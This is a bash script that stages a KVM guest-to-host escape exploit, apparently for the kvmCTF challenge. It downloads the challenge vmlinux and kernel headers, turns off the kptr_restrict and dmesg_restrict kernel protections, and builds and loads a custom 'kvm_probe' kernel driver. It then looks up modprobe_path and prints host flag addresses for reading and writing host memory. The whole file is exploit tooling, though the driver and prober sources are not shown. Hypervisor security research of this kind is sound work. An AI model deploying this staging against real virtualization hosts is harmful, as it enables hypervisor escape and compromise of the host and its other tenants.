#!/bin/bash

### ===Install basic build tools===
apt update -y >/dev/null
apt install sudo make xxd gdb build-essential binutils tar -y >/dev/null || true
apt install -f -y >/dev/null
sleep 2

if [ ! -f "/root/vmlinux" ]; then
    echo "[*] Downloading latest kvmctf bundle for vmlinux..."
    wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
    tar -xzf latest.tar.gz
    mv /root/kvmctf-6.1.74/vmlinux/vmlinux /root
    echo "[+] vmlinux moved to /root"
else
    echo "[+] /root/vmlinux already exists, skipping download."
fi

wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
dpkg -i linux-headers-6.1.0-21-common_6.1.90-1_all.deb || true
dpkg -i linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb || true
apt install -f -y >/dev/null

### ===Install with verification===
echo "[*] Installing common headers"
dpkg -i "linux-headers-${KERN_VER%-*}-common_6.1.90-1_all.deb" || true

echo "[*] Installing architecture-specific headers"
dpkg -i "linux-headers-${KERN_VER}_6.1.90-1_amd64.deb" || true

apt-get install linux-headers-6.1.0-21-common linux-image-6.1.0-21-amd64 -y
apt-get build-dep linux-headers-6.1.0-21-common linux-image-6.1.0-21-amd64 -y
apt-get --fix-missing install -y

### ===Verify installation===
echo "[*] Verifying header installation"
if [ -d "/lib/modules/$KERN_VER/build" ]; then
    echo "[+] Headers successfully installed at /lib/modules/$KERN_VER/build"
else
    echo "[!] Header installation failed - continuing with exploit anyway"
    echo "[!] Exploit doesn't require headers but they're nice to have for debugging"
fi

### ===System Configuration Checks===
echo "[*] Performing system configuration checks"

### ===Ensure kptr_restrict is disabled===
echo 0 | sudo tee /proc/sys/kernel/kptr_restrict >/dev/null
echo 0 | sudo tee /proc/sys/kernel/dmesg_restrict >/dev/null
echo "[+] Disabled kernel restrictions"

mkdir /tmp/kvm_probe
mv Makefile /tmp/kvm_probe
mv kvm_prober.c /tmp/kvm_probe
mv kvm_probe_drv.c /tmp/kvm_probe

cd /tmp/kvm_probe
make
cp kvm_prober /usr/bin
insmod kvm_probe_drv.ko
kvm_prober allocvqpage

cd /root
echo "fetching host modprobe path..."
nm ./vmlinux | grep modprobe_path

echo "host Addresses to scan WITH KASLR
Write flag VA: ffffffff8304f080
Phys: 824f080
Read flag VA: ffffffff83a58ae8
Phys: 8c58ae8"

echo "host addresses  WITHOUT KASLR
Write flag VA: 0xffffffff8304f080
phys: 0x204f080
Read flag VA: 0xffffffff83a58ae8
Phys: 0x8c58ae8"

